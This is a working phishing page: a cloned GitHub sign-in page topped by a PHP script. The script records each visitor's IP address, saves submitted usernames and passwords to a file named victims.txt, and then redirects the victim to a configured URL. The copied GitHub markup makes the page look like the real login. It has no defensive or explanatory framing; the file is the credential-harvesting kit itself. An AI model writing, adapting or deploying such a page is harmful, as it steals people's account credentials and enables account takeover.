<?php
function get_IP_address()
{
    foreach (array('HTTP_CLIENT_IP',
                   'HTTP_X_FORWARDED_FOR',
                   'HTTP_X_FORWARDED',
                   'HTTP_X_CLUSTER_CLIENT_IP',
                   'HTTP_FORWARDED_FOR',
                   'HTTP_FORWARDED',
                   'REMOTE_ADDR') as $key){
        if (array_key_exists($key, $_SERVER) === true){
            foreach (explode(',', $_SERVER[$key]) as $IPaddress){
                $IPaddress = trim($IPaddress); // Just to be safe

                if (filter_var($IPaddress,
                               FILTER_VALIDATE_IP,
                               FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)
                    !== false) {

                    return $IPaddress;
                }
            }
        }
    }
}
fwrite(fopen('ip.txt','w'),get_IP_address());
$user = $_POST['login'];
$pwd = $_POST['password'];
$r = fread(fopen('redir.txt','r'),filesize("redir.txt"));
if ($user && $pwd){
  $f = fopen('victims.txt','a+');
  fwrite($f,'USERNAME : '.$user.' PASSWORD : '.$pwd."\n");
  echo '<script type="text/javascript">window.location=\''.$r.'\';</script>';}
?>
<!DOCTYPE html>
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
  <link rel="dns-prefetch" href="https://github.githubassets.com/">
  <link rel="dns-prefetch" href="https://avatars.githubusercontent.com/">
  <link rel="dns-prefetch" href="https://github-cloud.s3.amazonaws.com/">
  <link rel="dns-prefetch" href="https://user-images.githubusercontent.com/">



  <link crossorigin="anonymous" media="all" integrity="sha512-ksCNMY+ascUCcqCl+IC3V3kQCULntFNmkpxnoATrz3fgnJZkblPtSkrHwvUbnI6eit7bUy9i9PpRXyI4lba9fw==" rel="stylesheet" href="https://github.githubassets.com/assets/frameworks-92c08d318f9ab1c50272a0a5f880b757.css">
  <link crossorigin="anonymous" media="all" integrity="sha512-OQfNnz+Vk23B3pL5IJn/1raKKLNAbQdlzxU0wk+8oPT9j1rsCDwnmUdy2lyuDtbpjKpVIEGtq3gSvvSp8nlUUQ==" rel="stylesheet" href="https://github.githubassets.com/assets/site-3907cd9f3f95936dc1de92f92099ffd6.css">
    <link crossorigin="anonymous" media="all" integrity="sha512-by3y2FNJEIIr1nw/4TEOeYZBUSkTyPHNFEb/kHJFZKeP7peS9nxMGvcnyKcP1bUbs69knYmItE8b0bhBFgAwAw==" rel="stylesheet" href="https://github.githubassets.com/assets/behaviors-6f2df2d8534910822bd67c3fe1310e79.css">
    
    
    
    <link crossorigin="anonymous" media="all" integrity="sha512-+wR5TGVa8lkasDwP/UHezM2dzVHlYwwCKkNp2SJwdImpiyFS6e1g7QBjCToEL196BGCDSJLoCKlBafH+Kmk1IA==" rel="stylesheet" href="https://github.githubassets.com/assets/github-fb04794c655af2591ab03c0ffd41decc.css">

  <script crossorigin="anonymous" defer="defer" integrity="sha512-8K2vvwbW+6H27Nad5ydg8PA2/aMD/LKq+EiK9s0U0hhVZxCI2tWBsYk9beAtisRw2j+Or5k2/F+6dk02nmj/PA==" type="application/javascript" src="https://github.githubassets.com/assets/environment-f0adafbf.js"></script>
    <script crossorigin="anonymous" defer="defer" integrity="sha512-pHQVSUcYeGpJmK7baqa+1rFMlFqwNLpDLywWtxzcW9XkzoI7oXURqWVaV4rHZ5wPaTmnCYWL1Ga1ya0GqmniLw==" type="application/javascript" src="https://github.githubassets.com/assets/chunk-frameworks-a4741549.js"></script>
    <script crossorigin="anonymous" defer="defer" integrity="sha512-j+Jh14HMLM8Q7Kn9WKyz5IcaKBxb8TlJvGLJDXGmyxXRZ72vvXgNXotXfaOA9b1V8NZRw8sKjUotlb2STSo9pQ==" type="application/javascript" src="https://github.githubassets.com/assets/chunk-vendor-8fe261d7.js"></script>
  
  <script crossorigin="anonymous" defer="defer" integrity="sha512-bN7mAj87I5HfS5E+BdFlEMOe9ha0aayRiwwo+a/oLWgRgAtE5h4oTCM1TDWutANlHIB4sHsliWR7CySG+Tw7kQ==" type="application/javascript" src="https://github.githubassets.com/assets/behaviors-6cdee602.js"></script>
  
    <script crossorigin="anonymous" defer="defer" integrity="sha512-MiuFoXnjDmRNVM/xNR9yfPr8Qi8Q6+TKWIrkXp+1QJv9MW8lpBfOy0u7AuVuXQVYKIhsr5DCuCxIs1STWpujLg==" type="application/javascript" data-module-id="./chunk-color-modes.js" src="https://github.githubassets.com/assets/chunk-color-modes-322b85a1.js"></script>
    <script crossorigin="anonymous" defer="defer" integrity="sha512-evfy6RyDyXvLuaEEFaUaIlw9dSRgvKkF3rMeUELkvXq7sGEK/43vTg+3EE6E8nOsjpuPyYQjgS8bxzqkTjlZag==" type="application/javascript" data-module-id="./chunk-contributions-spider-graph.js" data-src="https://github.githubassets.com/assets/chunk-contributions-spider-graph-7af7f2e9.js"></script>
    <script crossorigin="anonymous" defer="defer" integrity="sha512-obMR8mPKx8OvqRe34LgnUcxeJ1qujiA4ND3H6UX13ExMlA/WfHLjEzXRmgGRcRvN/8J1nzc+Z+jgz/PLTFy6zg==" type="application/javascript" data-module-id="./chunk-drag-drop.js" data-src="https://github.githubassets.com/assets/chunk-drag-drop-a1b311f2.js"></script>
    <script crossorigin="anonymous" defer="defer" integrity="sha512-cVnIoXzYnuz2SYwsbnuCpTFzvO17cPoQV2mK82+em//c8i7V2L0VEeInplXGgfbx4d8bQGQuPPx0P0BCRfJ37g==" type="application/javascript" data-module-id="./chunk-edit.js" src="https://github.githubassets.com/assets/chunk-edit-7159c8a1.js"></script>
    <script crossorigin="anonymous" defer="defer" integrity="sha512-TGnbT/6B5dxVwEk7iOlwSY9mfqhfq8m05ec+KjdlfEwoieq73iBeyidClQUSmFa2snukwzF9peY8c7FJf9FARA==" type="application/javascript" data-module-id="./chunk-emoji-picker-element.js" data-src="https://github.githubassets.com/assets/chunk-emoji-picker-element-4c69db4f.js"></script>
    <script crossorigin="anonymous" defer="defer" integrity="sha512-NwYkwzxETzKUYRXumHDsBIuggkh86KmJ1WrwWZW5wTvVPf047+wOmOHI5b4D65bfdtd3WbXJ7k+3ZWoxpIaqcA==" type="application/javascript" data-module-id="./chunk-insights-graph.js" data-src="https://github.githubassets.com/assets/chunk-insights-graph-370624c3.js"></script>
    <script crossorigin="anonymous" defer="defer" integrity="sha512-9Z+ebFCyEqZjbSw19ZE2Y5NIfh2NFpIqdIB7LTnANiWCnHRwr6JJONL2XeC8Wn7Xqdi/dTBZYFxu4xz8br/Ipg==" type="application/javascript" data-module-id="./chunk-jump-to.js" data-src="https://github.githubassets.com/assets/chunk-jump-to-f59f9e6c.js"></script>
    <script crossorigin="anonymous" defer="defer" integrity="sha512-S8aUo+fRvLif3bA63pJ03RyoYVNFJ7Q+aOmtVVHabaVFMwV1zMdE4HTEewMkbU0ZK2Ik5Q3Ob9/JE+zrNC5qaw==" type="application/javascript" data-module-id="./chunk-profile-pins-element.js" data-src="https://github.githubassets.com/assets/chunk-profile-pins-element-4bc694a3.js"></script>
    <script crossorigin="anonymous" defer="defer" integrity="sha512-E+H+wAtjiqutBvn2cnXzDIvmasIhYiS7i7JzOfFUwo+Ej8zT54OrJtP//RhwixnypgOpCF4JvqzYy6zOtORDmg==" type="application/javascript" data-module-id="./chunk-runner-groups.js" src="https://github.githubassets.com/assets/chunk-runner-groups-13e1fec0.js"></script>
    <script crossorigin="anonymous" defer="defer" integrity="sha512-KymSs571ny/ieEG/wBgNd4vK3utdIgwqW/Rw6gCKCfg9BLYrivlwwUQNqkY2lcV1AiRf6HecGBQiAJB8IlJZBg==" type="application/javascript" data-module-id="./chunk-sortable-behavior.js" data-src="https://github.githubassets.com/assets/chunk-sortable-behavior-2b2992b3.js"></script>
    <script crossorigin="anonymous" defer="defer" integrity="sha512-cAsQOq53AtF8bCPWtKuMXOB2Jjt2089fKQQXtk1bNk2ZSBjx2yQOdGZWsXDfWG5H8FmjJzZsepBmOhy+wO7uAQ==" type="application/javascript" data-module-id="./chunk-toast.js" data-src="https://github.githubassets.com/assets/chunk-toast-700b103a.js"></script>
    <script crossorigin="anonymous" defer="defer" integrity="sha512-Rr2DoDIAsZ5Y6CcVYMkbg2qdAri8r5N2XcUei+mRGDF9+XJ9ftYfarH5fvJAlKIWW8bR1G2xNnfTAJ/aYjOLjg==" type="application/javascript" data-module-id="./chunk-tweetsodium.js" data-src="https://github.githubassets.com/assets/chunk-tweetsodium-46bd83a0.js"></script>
    <script crossorigin="anonymous" defer="defer" integrity="sha512-7uTaKvkjFu7v8DvnLZKugOU4Vqru2XnYu1CaqKTvcMXGw6XvOIOBmhPvgdRunAbaxjKj/aNYokUmTXMk436g0Q==" type="application/javascript" data-module-id="./chunk-user-status-submit.js" data-src="https://github.githubassets.com/assets/chunk-user-status-submit-eee4da2a.js"></script>
    <script crossorigin="anonymous" defer="defer" integrity="sha512-qFsShJX3EkHdcQq11CLfRk444sM6/0OBXB8eTN3FZl70HSy6jUPI2M9H6/wNWDwOR+LLU/JE55Y2kl1CK1QioQ==" type="application/javascript" src="https://github.githubassets.com/assets/unsupported-a85b1284.js"></script>

  <script crossorigin="anonymous" defer="defer" integrity="sha512-jfhb26e6jc9mv2xbV7tq73WTYyIc2ArY7wZf98FXk6fAJ2B82hQ78B026jMNJDwS9w5fhWcNFBKczJSvhq851Q==" type="application/javascript" src="https://github.githubassets.com/assets/settings-8df85bdb.js"></script>
<script crossorigin="anonymous" defer="defer" integrity="sha512-1HedrbdfSPJBilypL42OZotjCxrT4Fq6rEabXjLcs+cNnm0+n3dW4nCizUXgIxOqa0JTlFIQN53GGfI9A5oPPw==" type="application/javascript" src="https://github.githubassets.com/assets/sessions-d4779dad.js"></script>

  <meta name="viewport" content="width=device-width">
  
  <title>Sign in to GitHub · GitHub</title>
    <meta name="description" content="GitHub is where people build software. More than 56 million people use GitHub to discover, fork, and contribute to over 100 million projects.">
    <link rel="search" type="application/opensearchdescription+xml" href="https://github.com/opensearch.xml" title="GitHub">
  <link rel="fluid-icon" href="https://github.com/fluidicon.png" title="GitHub">
  <meta property="fb:app_id" content="1401488693436528">
  
    <meta property="og:url" content="https://github.com">
    <meta property="og:site_name" content="GitHub">
    <meta property="og:title" content="Build software better, together">
    <meta property="og:description" content="GitHub is where people build software. More than 56 million people use GitHub to discover, fork, and contribute to over 100 million projects.">
    <meta property="og:image" content="https://github.githubassets.com/images/modules/open_graph/github-logo.png">
    <meta property="og:image:type" content="image/png">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="1200">
    <meta property="og:image" content="https://github.githubassets.com/images/modules/open_graph/github-mark.png">
    <meta property="og:image:type" content="image/png">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="620">
    <meta property="og:image" content="https://github.githubassets.com/images/modules/open_graph/github-octocat.png">
    <meta property="og:image:type" content="image/png">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="620">

    <meta property="twitter:site" content="github">
    <meta property="twitter:site:id" content="13334762">
    <meta property="twitter:creator" content="github">
    <meta property="twitter:creator:id" content="13334762">
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:title" content="GitHub">
    <meta property="twitter:description" content="GitHub is where people build software. More than 56 million people use GitHub to discover, fork, and contribute to over 100 million projects.">
    <meta property="twitter:image:src" content="https://github.githubassets.com/images/modules/open_graph/github-logo.png">
    <meta property="twitter:image:width" content="1200">
    <meta property="twitter:image:height" content="1200">



    

  <link rel="assets" href="https://github.githubassets.com/">
  

  <meta name="request-id" content="0A28:1A15:1672DD1:183175D:6058E1DA" data-pjax-transient="true"><meta name="html-safe-nonce" content="e5b65ca3f5de93fba86970962aede000be357d54845c0302a3c412f608fd72c1" data-pjax-transient="true"><meta name="visitor-payload" content="eyJyZWZlcnJlciI6Imh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vIiwicmVxdWVzdF9pZCI6IjBBMjg6MUExNToxNjcyREQxOjE4MzE3NUQ6NjA1OEUxREEiLCJ2aXNpdG9yX2lkIjoiNjk3MzM0NzA1MTMwMTU2MDc5NSIsInJlZ2lvbl9lZGdlIjoiYXAtc291dGgtMSIsInJlZ2lvbl9yZW5kZXIiOiJpYWQifQ==" data-pjax-transient="true"><meta name="visitor-hmac" content="9ba0554ab1a7d5da5e53f44da855588ca7959a3c8e5510f1e59920937d0c3dc2" data-pjax-transient="true">



  <meta name="github-keyboard-shortcuts" content="" data-pjax-transient="true">

  

  <meta name="selected-link" value="/login" data-pjax-transient="">

    <meta name="google-site-verification" content="c1kuD-K2HIVF635lypcsWPoD4kilo5-jA_wBFyT4uMY">
  <meta name="google-site-verification" content="KT5gs8h0wvaagLKAVWq8bbeNwnZZK1r1XQysX3xurLU">
  <meta name="google-site-verification" content="ZzhVyEFwb7w3e0-uOTltm8Jsck2F5StVihD0exw2fsA">
  <meta name="google-site-verification" content="GXs5KoUUkNCoaAZn7wPN-t01Pywp9M3sEjnt_3_ZWPc">

  <meta name="octolytics-host" content="collector.githubapp.com"><meta name="octolytics-app-id" content="github"><meta name="octolytics-event-url" content="https://collector.githubapp.com/github-external/browser_event">

  <meta name="analytics-location-query-strip" content="true" data-pjax-transient="true">

  






  

      <meta name="hostname" content="github.com">
    <meta name="user-login" content="">


      <meta name="expected-hostname" content="github.com">


    <meta name="enabled-features" content="MARKETPLACE_PENDING_INSTALLATIONS,AUTOCOMPLETE_EMOJIS_IN_MARKDOWN_EDITOR">

  <meta http-equiv="x-pjax-version" content="87dc4e37b5a1d979b5937a54e7664f3999a8359a012191e9561399e005056a9d">
  



    <link rel="canonical" href="https://github.com/login" data-pjax-transient="">


  <meta name="browser-stats-url" content="https://api.github.com/_private/browser/stats">

  <meta name="browser-errors-url" content="https://api.github.com/_private/browser/errors">

  <meta name="browser-optimizely-client-errors-url" content="https://api.github.com/_private/browser/optimizely_client/errors">

  <link rel="mask-icon" href="https://github.githubassets.com/pinned-octocat.svg" color="#000000">
  <link rel="alternate icon" class="js-site-favicon" type="image/png" href="https://github.githubassets.com/favicons/favicon.png">
  <link rel="icon" class="js-site-favicon" type="image/svg+xml" href="https://github.githubassets.com/favicons/favicon.svg">

<meta name="theme-color" content="#1e2327">



  <link rel="manifest" href="https://github.com/manifest.json" crossorigin="use-credentials">


  </head>

  <body class="logged-out env-production page-responsive session-authentication intent-mouse" style="word-wrap: break-word;">
    

    <div class="position-relative js-header-wrapper ">
      <a href="https://github.com/login#start-of-content" class="px-2 py-4 color-bg-info-inverse color-text-white show-on-focus js-skip-to-content">Skip to content</a>
      <span class="progress-pjax-loader width-full js-pjax-loader-bar Progress position-fixed">
    <span style="background-color: #79b8ff;width: 0%;" class="Progress-item progress-pjax-loader-bar "></span>
</span>      
      

          <div id="unsupported-browser" class="unsupported-browser" hidden="">
  <div class="container-lg p-responsive clearfix d-flex flex-items-center py-2">
      <svg height="16" class="octicon octicon-alert mr-2 color-gray-7 hide-sm" viewBox="0 0 16 16" version="1.1" width="16" aria-hidden="true"><path fill-rule="evenodd" d="M8.22 1.754a.25.25 0 00-.44 0L1.698 13.132a.25.25 0 00.22.368h12.164a.25.25 0 00.22-.368L8.22 1.754zm-1.763-.707c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0114.082 15H1.918a1.75 1.75 0 01-1.543-2.575L6.457 1.047zM9 11a1 1 0 11-2 0 1 1 0 012 0zm-.25-5.25a.75.75 0 00-1.5 0v2.5a.75.75 0 001.5 0v-2.5z"></path></svg>
    <div class="d-flex flex-auto flex-column flex-md-row">
      <div class="flex-auto min-width-0 mr-2" style="padding-top:1px">
        <span>GitHub no longer supports this web browser.</span>
        <a href="https://docs.github.com/articles/supported-browsers">
          Learn more about the browsers we support.
        </a>
      </div>
    </div>
  </div>
</div>



        <div class="header header-logged-out width-full pt-5 pb-4" role="banner">
  <div class="container clearfix width-full text-center">
    <a class="header-logo" href="https://github.com/" aria-label="Homepage" data-ga-click="(Logged out) Header, go to homepage, icon:logo-wordmark">
      <svg height="48" class="octicon octicon-mark-github" viewBox="0 0 16 16" version="1.1" width="48" aria-hidden="true"><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path></svg>
    </a>
  </div>
</div>


    </div>

  <div id="start-of-content" class="show-on-focus"></div>






    

  <include-fragment class="js-notification-shelf-include-fragment" data-base-src="https://github.com/notifications/beta/shelf"></include-fragment>




  <div class="application-main " data-commit-hovercards-enabled="" data-discussion-hovercards-enabled="" data-issue-and-pr-hovercards-enabled="">
        <main id="js-pjax-container" data-pjax-container="">
          


  <div class="auth-form px-3" id="login">


      <input type="hidden" name="ga_id" class="js-octo-ga-id-input">
      <div class="auth-form-header p-0">
        <h1>Sign in to GitHub</h1>
      </div>


      <div data-pjax-replace="" id="js-flash-container">


  <template class="js-flash-template"></template>
</div>


      <div class="flash js-transform-notice" hidden="">
        <button class="flash-close js-flash-close" type="button" aria-label="Dismiss this message">
          <svg aria-label="Dismiss" class="octicon octicon-x" height="16" viewBox="0 0 16 16" version="1.1" width="16" aria-hidden="true"><path fill-rule="evenodd" d="M3.72 3.72a.75.75 0 011.06 0L8 6.94l3.22-3.22a.75.75 0 111.06 1.06L9.06 8l3.22 3.22a.75.75 0 11-1.06 1.06L8 9.06l-3.22 3.22a.75.75 0 01-1.06-1.06L6.94 8 3.72 4.78a.75.75 0 010-1.06z"></path></svg>
        </button>
      </div>

      <div class="auth-form-body mt-3">

          <!-- '"` --><!-- </textarea></xmp> --><form action="" accept-charset="UTF-8" method="post"><input type="hidden" name="authenticity_token" value="bPd+f/vVPGvEWCiM68dMDoy/LKtfTHp9Jndlsj2gbrmZy4G7buIjWz8eWUbdCRBV4y3kn9CV26zQm26z0DfYDw==">  <label for="login_field">
    Username or email address
  </label>
  <input type="text" name="login" id="login_field" class="form-control input-block" autocapitalize="off" autocorrect="off" autocomplete="username" autofocus="autofocus">

  <div class="position-relative">
    <label for="password">
      Password
    </label>
    <input type="password" name="password" id="password" class="form-control form-control input-block" autocomplete="current-password">
    <input type="hidden" name="trusted_device" id="trusted_device" class="form-control">
    <input type="hidden" class="js-webauthn-support" name="webauthn-support" value="supported">
<input type="hidden" class="js-webauthn-iuvpaa-support" name="webauthn-iuvpaa-support" value="unsupported">
<input type="hidden" name="return_to" id="return_to" class="form-control">
<input type="hidden" name="allow_signup" id="allow_signup" class="form-control">
<input type="hidden" name="client_id" id="client_id" class="form-control">
<input type="hidden" name="integration" id="integration" class="form-control">
<input type="text" name="required_field_42d7" hidden="hidden" class="form-control"><input type="hidden" name="timestamp" value="1616437723035" class="form-control"><input type="hidden" name="timestamp_secret" value="6402f8bf7b864c8853bf00e17b469fd16e4623f50409674000a9e3b47102d1b8" class="form-control">

    <input type="submit" name="commit" value="Sign in" class="btn btn-primary btn-block" data-disable-with="Signing in…">

    <a class="label-link position-absolute top-0 right-0" tabindex="0" href="https://github.com/password_reset">Forgot password?</a>
  </div>
</form>
      </div>




        <p class="login-callout mt-3">
          New to GitHub?
          <a data-ga-click="Sign in, switch to sign up" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;sign in switch to sign up&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;SIGN_UP&quot;,&quot;originating_url&quot;:&quot;https://github.com/login&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="72d062e79bb6ab076a3b88b32943286ea51894183bd812a5038d00013946f239" href="https://github.com/join?source=login">Create an account</a>.
        </p>
  </div>

        </main>
  </div>

          <div class="footer container-lg p-responsive py-6 mt-6 f6" role="contentinfo">
    <ul class="list-style-none d-flex flex-justify-center">
        <li class="mr-3"><a href="https://github.com/site/terms" data-ga-click="Footer, go to terms, text:terms">Terms</a></li>
        <li class="mr-3"><a href="https://github.com/site/privacy" data-ga-click="Footer, go to privacy, text:privacy">Privacy</a></li>
        <li class="mr-3"><a href="https://docs.github.com/articles/github-security/" data-ga-click="Footer, go to security, text:security">Security</a></li>
          <li><a class="Link--secondary" data-ga-click="Footer, go to contact, text:contact" href="https://github.com/contact">Contact GitHub</a></li>
    </ul>
  </div>



  <div id="ajax-error-message" class="ajax-error-message flash flash-error" hidden="">
    <svg class="octicon octicon-alert" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8.22 1.754a.25.25 0 00-.44 0L1.698 13.132a.25.25 0 00.22.368h12.164a.25.25 0 00.22-.368L8.22 1.754zm-1.763-.707c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0114.082 15H1.918a1.75 1.75 0 01-1.543-2.575L6.457 1.047zM9 11a1 1 0 11-2 0 1 1 0 012 0zm-.25-5.25a.75.75 0 00-1.5 0v2.5a.75.75 0 001.5 0v-2.5z"></path></svg>
    <button type="button" class="flash-close js-ajax-error-dismiss" aria-label="Dismiss error">
      <svg class="octicon octicon-x" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M3.72 3.72a.75.75 0 011.06 0L8 6.94l3.22-3.22a.75.75 0 111.06 1.06L9.06 8l3.22 3.22a.75.75 0 11-1.06 1.06L8 9.06l-3.22 3.22a.75.75 0 01-1.06-1.06L6.94 8 3.72 4.78a.75.75 0 010-1.06z"></path></svg>
    </button>
    You can’t perform that action at this time.
  </div>

  <div class="js-stale-session-flash flash flash-warn flash-banner" hidden="">
    <svg class="octicon octicon-alert" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8.22 1.754a.25.25 0 00-.44 0L1.698 13.132a.25.25 0 00.22.368h12.164a.25.25 0 00.22-.368L8.22 1.754zm-1.763-.707c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0114.082 15H1.918a1.75 1.75 0 01-1.543-2.575L6.457 1.047zM9 11a1 1 0 11-2 0 1 1 0 012 0zm-.25-5.25a.75.75 0 00-1.5 0v2.5a.75.75 0 001.5 0v-2.5z"></path></svg>
    <span class="js-stale-session-flash-signed-in" hidden="">You signed in with another tab or window. <a href="https://github.com/login">Reload</a> to refresh your session.</span>
    <span class="js-stale-session-flash-signed-out" hidden="">You signed out in another tab or window. <a href="https://github.com/login">Reload</a> to refresh your session.</span>
  </div>
    <template id="site-details-dialog"></template>

    <div class="Popover js-hovercard-content position-absolute" style="display: none; outline: none;" tabindex="0">
  <div class="Popover-message Popover-message--bottom-left Popover-message--large Box color-shadow-large" style="width:360px;">
  </div>
</div>




  


<div aria-live="polite" class="sr-only"></div></body></html>